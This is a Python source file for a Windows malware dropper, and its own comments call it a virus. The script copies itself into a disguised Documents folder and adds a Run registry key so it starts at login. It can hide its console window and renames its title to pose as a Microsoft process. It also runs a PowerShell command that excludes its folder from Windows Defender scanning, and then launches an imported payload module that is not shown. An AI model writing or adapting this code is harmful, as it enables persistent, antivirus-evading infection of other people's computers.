import execute_script as exc # Code we want to execute on boot
import zeno_embed_func as zeno
import os
import os.path
import winreg as reg
from pathlib import Path
import shutil
import win32gui, win32con
import ctypes
import multiprocessing

#? Options & Settings ?#
# 1 = On
# 0 = Off
install_set=int(1) # Install to custom directory [ HAS TO BE SET TO 1, BROKEN SCRIPT ]
startup_set=int(1) # Startup with windows at login screen
hide_console=int(0) # Hide console on startup and execution
add_exclusion=int(1) # Add Exclusion to Windows Antivirus through Powershell (Only requires admin rights once)
exec_dumb=int(1) # Execute a piece of code if the EXE is ran by the user (Malware will still run in background without GUI)
ctypes.windll.kernel32.SetConsoleTitleW("Microsoft (R) Aggregator Host") # Change Process Title/Handle

# /?data_inf?/ #
get_filename = f"{os.path.basename(__file__)}" # Get self file name to import too
filename=str(get_filename.replace(".py", ".exe")) # Replace .py in name to .exe (This is a compiler issue, Do not remove this or change any code relating to it)
user = os.getlogin() # Get Username of PC Directory (users)
self_path=str(f"{os.getcwd()}") # Get Path of Self #
install_path=str(f"C:\\Users\\{user}\\Documents\\dotnetV5") # Path to install the virus too ( MUST HAVE \\ not \ )
win_locStart=str(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") # Windows Shortcut Directory ( DO NOT CHANGE THIS )

class install_embed():
    def install_windows():
        isExist = os.path.exists(install_path)
        if not isExist:
            os.makedirs(install_path)
        is_exist = os.path.isfile(f"{install_path}\\{filename}")
        if is_exist:
            return 1
        else:
            shutil.copy(f'{self_path}\\{filename}', f'{install_path}')
            return 0
    def add_to_registry():
        address=str(f"{install_path}\\{filename}")
        print(address)
        # key we want to change is HKEY_CURRENT_USER
        # key value is Software\Microsoft\Windows\CurrentVersion\Run
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
         
        # open the key to make changes to
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
         
        # modify the opened key
        reg.SetValueEx(open,"1002_winvert",0,reg.REG_SZ,address)
         
        # now close the opened key
        reg.CloseKey(open)

class setup_proc():
    def chk_ins():
        if install_set == 1: # Install to Directory #
            install_embed_return = install_embed.install_windows()
        print(install_embed_return)
        if startup_set == 1: # Add to Startup #
            if install_embed_return == 0:
                install_embed.add_to_registry()
        if hide_console == 1:
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide , win32con.SW_HIDE)
        if add_exclusion == 1:
            if install_embed_return == 0:
                script=str(f'powershell.exe -Command Add-MpPreference -ExclusionPath "{install_path}"')
                zeno.powershell(install_path=install_path, script=script)
        # /?Execute Code?/ #
        exc.exec.main_func()

class gui():
    def menu():
        print("""
ok
        """)

if __name__=="__main__":
    setup_proc.chk_ins()
